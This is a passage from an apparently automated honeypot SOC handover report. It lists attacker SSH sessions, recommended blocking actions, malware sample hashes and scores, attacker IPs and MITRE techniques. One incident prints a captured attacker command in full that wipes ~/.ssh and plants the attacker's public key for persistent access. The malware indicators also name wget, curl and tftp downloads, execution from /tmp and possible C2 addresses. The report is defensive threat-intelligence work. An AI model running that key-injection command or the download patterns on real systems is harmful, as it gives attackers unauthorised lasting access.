| `2026-07-02 18:23:10` | `cowrie.login.success` |
| `2026-07-02 18:23:14` | `cowrie.session.params` |
| `2026-07-02 18:23:14` | `cowrie.command.input` |
| `2026-07-02 18:23:16` | `cowrie.log.closed` |
| `2026-07-02 18:23:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d21266f5883d

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 18:33 |
| **Last Seen** | 2026-07-02 18:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:33:25` | `cowrie.session.connect` |
| `2026-07-02 18:33:25` | `cowrie.client.version` |
| `2026-07-02 18:33:25` | `cowrie.client.kex` |
| `2026-07-02 18:33:27` | `cowrie.login.success` |
| `2026-07-02 18:33:29` | `cowrie.session.params` |
| `2026-07-02 18:33:29` | `cowrie.command.input` |
| `2026-07-02 18:33:29` | `cowrie.log.closed` |
| `2026-07-02 18:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4aa335f4f48

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 18:34 |
| **Last Seen** | 2026-07-02 18:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:34:36` | `cowrie.session.connect` |
| `2026-07-02 18:34:37` | `cowrie.client.version` |
| `2026-07-02 18:34:37` | `cowrie.client.kex` |
| `2026-07-02 18:34:43` | `cowrie.login.success` |
| `2026-07-02 18:34:47` | `cowrie.session.params` |
| `2026-07-02 18:34:47` | `cowrie.command.input` |
| `2026-07-02 18:34:48` | `cowrie.log.closed` |
| `2026-07-02 18:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a71dd2d085d6

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 18:36 |
| **Last Seen** | 2026-07-02 18:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:36:19` | `cowrie.session.connect` |
| `2026-07-02 18:36:19` | `cowrie.client.version` |
| `2026-07-02 18:36:19` | `cowrie.client.kex` |
| `2026-07-02 18:36:19` | `cowrie.login.success` |
| `2026-07-02 18:36:20` | `cowrie.session.params` |
| `2026-07-02 18:36:20` | `cowrie.command.input` |
| `2026-07-02 18:36:20` | `cowrie.log.closed` |
| `2026-07-02 18:36:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0ad5c26b519

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-02 18:38 |
| **Last Seen** | 2026-07-02 18:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:38:43` | `cowrie.session.connect` |
| `2026-07-02 18:38:43` | `cowrie.client.version` |
| `2026-07-02 18:38:44` | `cowrie.client.kex` |
| `2026-07-02 18:38:44` | `cowrie.login.success` |
| `2026-07-02 18:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88b863af1ba5

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-02 18:38 |
| **Last Seen** | 2026-07-02 18:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:38:44` | `cowrie.session.connect` |
| `2026-07-02 18:38:44` | `cowrie.client.version` |
| `2026-07-02 18:38:44` | `cowrie.client.kex` |
| `2026-07-02 18:38:45` | `cowrie.login.success` |
| `2026-07-02 18:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2209ca92e60c

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-07-02 18:45 |
| **Last Seen** | 2026-07-02 18:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:45:27` | `cowrie.session.connect` |
| `2026-07-02 18:45:27` | `cowrie.client.version` |
| `2026-07-02 18:45:27` | `cowrie.client.kex` |
| `2026-07-02 18:45:28` | `cowrie.login.success` |
| `2026-07-02 18:45:29` | `cowrie.session.params` |
| `2026-07-02 18:45:29` | `cowrie.command.input` |
| `2026-07-02 18:45:29` | `cowrie.command.failed` |
| `2026-07-02 18:45:30` | `cowrie.log.closed` |
| `2026-07-02 18:45:31` | `cowrie.session.params` |
| `2026-07-02 18:45:31` | `cowrie.command.input` |
| `2026-07-02 18:45:31` | `cowrie.session.file_download` |
| `2026-07-02 18:45:31` | `cowrie.log.closed` |
| `2026-07-02 18:45:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-715647dd9b0a

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-07-02 18:45 |
| **Last Seen** | 2026-07-02 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:45:31` | `cowrie.session.connect` |
| `2026-07-02 18:45:31` | `cowrie.client.version` |
| `2026-07-02 18:45:31` | `cowrie.client.kex` |
| `2026-07-02 18:45:32` | `cowrie.login.success` |
| `2026-07-02 18:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6969048d23a4

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-07-02 18:45 |
| **Last Seen** | 2026-07-02 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:45:33` | `cowrie.session.connect` |
| `2026-07-02 18:45:33` | `cowrie.client.version` |
| `2026-07-02 18:45:33` | `cowrie.client.kex` |
| `2026-07-02 18:45:34` | `cowrie.login.success` |
| `2026-07-02 18:45:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f77259e6bf8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 18:46 |
| **Last Seen** | 2026-07-02 18:46 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:46:07` | `cowrie.session.connect` |
| `2026-07-02 18:46:09` | `cowrie.client.version` |
| `2026-07-02 18:46:09` | `cowrie.client.kex` |
| `2026-07-02 18:46:15` | `cowrie.login.success` |
| `2026-07-02 18:46:18` | `cowrie.session.params` |
| `2026-07-02 18:46:18` | `cowrie.command.input` |
| `2026-07-02 18:46:20` | `cowrie.log.closed` |
| `2026-07-02 18:46:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf65c2fdd8bc

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 18:47 |
| **Last Seen** | 2026-07-02 18:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:47:18` | `cowrie.session.connect` |
| `2026-07-02 18:47:19` | `cowrie.client.version` |
| `2026-07-02 18:47:19` | `cowrie.client.kex` |
| `2026-07-02 18:47:20` | `cowrie.login.success` |
| `2026-07-02 18:47:21` | `cowrie.session.params` |
| `2026-07-02 18:47:21` | `cowrie.command.input` |
| `2026-07-02 18:47:21` | `cowrie.log.closed` |
| `2026-07-02 18:47:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **10** | 2026-07-02 17:03 | 2026-07-02 18:45 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `195.178.110[.]227` | **3** | 2026-07-02 17:41 | 2026-07-02 17:54 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.148.10[.]121` | **2** | 2026-07-02 18:42 | 2026-07-02 18:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **2** | 2026-07-02 17:52 | 2026-07-02 18:14 | 2m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]94` | **2** | 2026-07-02 17:55 | 2026-07-02 17:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.173.85[.]94` | 1 | 2026-07-02 18:19 | 2026-07-02 18:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.53.123[.]118` | 1 | 2026-07-02 17:00 | 2026-07-02 17:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.31.115[.]157` | 1 | 2026-07-02 17:19 | 2026-07-02 17:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.56.157[.]254` | 1 | 2026-07-02 18:29 | 2026-07-02 18:30 | 60s | 0 | `T1592` | 🟢 LOW |
| `128.201.116[.]240` | 1 | 2026-07-02 18:40 | 2026-07-02 18:41 | 12s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]109` | 1 | 2026-07-02 17:28 | 2026-07-02 17:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.46[.]139` | 1 | 2026-07-02 18:54 | 2026-07-02 18:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `141.11.88[.]119` | 1 | 2026-07-02 17:52 | 2026-07-02 17:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `141.11.88[.]121` | 1 | 2026-07-02 17:26 | 2026-07-02 17:26 | 29s | 0 | `T1592` | 🟢 LOW |
| `141.11.88[.]122` | 1 | 2026-07-02 17:49 | 2026-07-02 17:49 | 30s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-07-02 17:46 | 2026-07-02 17:46 | 2s | 0 | `T1592` | 🟢 LOW |
| `180.76.185[.]216` | 1 | 2026-07-02 17:16 | 2026-07-02 17:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]81` | 1 | 2026-07-02 17:52 | 2026-07-02 17:53 | 60s | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]156` | 1 | 2026-07-02 17:32 | 2026-07-02 17:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]50` | 1 | 2026-07-02 16:58 | 2026-07-02 16:58 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `141.11.88[.]119` | US | Vantiva SA | **100** ⚠️ | 16 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 7 |
| `128.201.116[.]240` | CL | Señalmax E.I.R.L | **100** ⚠️ | 3 |
| `220.127.148[.]6` | KR | Seuteuwoldeu | **100** ⚠️ | 10 |
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 8 |
| `141.11.88[.]121` | US | Vantiva SA | **100** ⚠️ | 8 |
| `41.242.115[.]83` | GH | DOLPHIN TELECOMMUNICATION LIMITED | **100** ⚠️ | 50 |
| `113.164.66[.]10` | VN | Vietnam Posts and Telecommunications Group | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 85 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 74 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 19 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 10 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 10 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 115 cases |
| Tool 34  | Credential Extractor        | ✅ 93 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 37 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (6.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

